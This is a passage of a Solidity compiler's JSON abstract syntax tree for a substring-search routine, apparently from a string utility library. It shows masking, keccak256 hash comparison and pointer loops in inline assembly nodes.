																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 1074,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "11557:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "11544:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 1163,
																"nodeType": "Block",
																"src": "12194:466:0",
																"statements": [
																	{
																		"assignments": [
																			1132
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1132,
																				"mutability": "mutable",
																				"name": "hash",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1163,
																				"src": "12261:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1131,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12261:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1133,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12261:12:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "12300:43:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "12302:39:0",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "12320:9:0"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "12331:9:0"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "12310:9:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "12310:31:0"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "12302:4:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1132,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12302:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1056,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12331:9:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1058,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12320:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 1134,
																		"nodeType": "InlineAssembly",
																		"src": "12291:52:0"
																	},
																	{
																		"body": {
																			"id": 1161,
																			"nodeType": "Block",
																			"src": "12410:236:0",
																			"statements": [
																				{
																					"assignments": [
																						1148
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1148,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nodeType": "VariableDeclaration",
																							"overrides": null,
																							"scope": 1161,
																							"src": "12432:16:0",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 1147,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "12432:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1149,
																					"initialValue": null,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "12432:16:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "12479:41:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "12481:37:0",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "12503:3:0"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "12508:9:0"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "12493:9:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "12493:25:0"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "12481:8:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 1056,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12508:9:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1064,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12503:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1148,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12481:8:0",
																							"valueSize": 1
																						}
																					],
																					"id": 1150,
																					"nodeType": "InlineAssembly",
																					"src": "12470:50:0"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 1153,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1151,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1132,
																							"src": "12545:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1152,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1148,
																							"src": "12553:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "12545:16:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1156,
																					"nodeType": "IfStatement",
																					"src": "12541:56:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"id": 1154,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1064,
																							"src": "12594:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 1062,
																						"id": 1155,
																						"nodeType": "Return",
																						"src": "12587:10:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1159,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 1157,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1064,
																							"src": "12619:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 1158,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "12626:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "12619:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1160,
																					"nodeType": "ExpressionStatement",
																					"src": "12619:8:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1143,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1139,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1068,
																				"src": "12375:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1142,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1140,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1052,
																					"src": "12382:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1141,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1056,
																					"src": "12392:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "12382:19:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "12375:26:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 1162,
																		"initializationExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 1137,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 1135,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1068,
																					"src": "12366:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 1136,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "12372:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "12366:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1138,
																			"nodeType": "ExpressionStatement",
																			"src": "12366:7:0"
																		},
																		"loopExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 1145,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "12403:5:0",
																				"subExpression": {
																					"argumentTypes": null,
																					"id": 1144,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1068,
																					"src": "12403:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1146,
																			"nodeType": "ExpressionStatement",
																			"src": "12403:5:0"
																		},
																		"nodeType": "ForStatement",
																		"src": "12361:285:0"
																	}
																]
															},
															"id": 1164,
															"nodeType": "IfStatement",
															"src": "11540:1120:0",
															"trueBody": {
																"id": 1130,
																"nodeType": "Block",
																"src": "11561:627:0",
																"statements": [
																	{
																		"assignments": [
																			1077
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1077,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1130,
																				"src": "11579:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1076,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "11579:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1094,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1092,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "11602:34:0",
																					"subExpression": {
																						"argumentTypes": null,
																						"components": [
																							{
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 1090,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 1088,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"argumentTypes": null,
																										"hexValue": "32",
																										"id": 1080,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "11604:1:0",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"argumentTypes": null,
																										"components": [
																											{
																												"argumentTypes": null,
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 1086,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"argumentTypes": null,
																													"hexValue": "38",
																													"id": 1081,
																													"isConstant": false,
																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "11610:1:0",
																													"subdenomination": null,
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"argumentTypes": null,
																													"components": [
																														{
																															"argumentTypes": null,
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 1084,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"argumentTypes": null,
																																"hexValue": "3332",
																																"id": 1082,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "11615:2:0",
																																"subdenomination": null,
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"argumentTypes": null,
																																"id": 1083,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 1056,
																																"src": "11620:9:0",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "11615:14:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 1085,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "11614:16:0",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "11610:20:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 1087,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "11609:22:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "11604:27:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"argumentTypes": null,
																									"hexValue": "31",
																									"id": 1089,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "11634:1:0",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "11604:31:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 1091,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "11603:33:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1079,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "11594:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 1078,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "11594:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1093,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "11594:43:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "11579:58:0"
																	},
																	{
																		"assignments": [
																			1096
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1096,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1130,
																				"src": "11656:18:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1095,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "11656:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1097,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "11656:18:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "11701:45:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "11703:41:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "11727:9:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "11721:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "11721:16:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "11739:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "11717:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "11717:27:0"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "11703:10:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1077,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "11739:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1096,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "11703:10:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1058,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "11727:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 1098,
																		"nodeType": "InlineAssembly",
																		"src": "11692:54:0"
																	},
																	{
																		"assignments": [
																			1100
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1100,
																				"mutability": "mutable",
																				"name": "end",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1130,
																				"src": "11764:8:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 1099,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "11764:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1106,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1105,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1103,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1101,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1054,
																					"src": "11775:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1102,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1052,
																					"src": "11785:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "11775:17:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1104,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1056,
																				"src": "11795:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "11775:29:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "11764:40:0"
																	},
																	{
																		"assignments": [
																			1108
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1108,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1130,
																				"src": "11822:15:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1107,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "11822:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1109,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "11822:15:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "11864:36:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "11866:32:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "11887:3:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "11881:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "11881:10:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "11893:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "11877:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "11877:21:0"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "11866:7:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1077,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "11893:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1064,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "11887:3:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1108,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "11866:7:0",
																				"valueSize": 1
																			}
																		],
																		"id": 1110,
																		"nodeType": "InlineAssembly",
																		"src": "11855:45:0"
																	},
																	{
																		"body": {
																			"id": 1126,
																			"nodeType": "Block",
																			"src": "11948:198:0",
																			"statements": [
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1116,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1114,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1064,
																							"src": "11974:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1115,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1100,
																							"src": "11981:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "11974:10:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1121,
																					"nodeType": "IfStatement",
																					"src": "11970:64:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 1119,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"id": 1117,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1054,
																								"src": "12017:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 1118,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1052,
																								"src": "12027:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "12017:17:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 1062,
																						"id": 1120,
																						"nodeType": "Return",
																						"src": "12010:24:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1123,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "12056:5:0",
																						"subExpression": {
																							"argumentTypes": null,
																							"id": 1122,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1064,
																							"src": "12056:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1124,
																					"nodeType": "ExpressionStatement",
																					"src": "12056:5:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "12092:36:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "12094:32:0",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
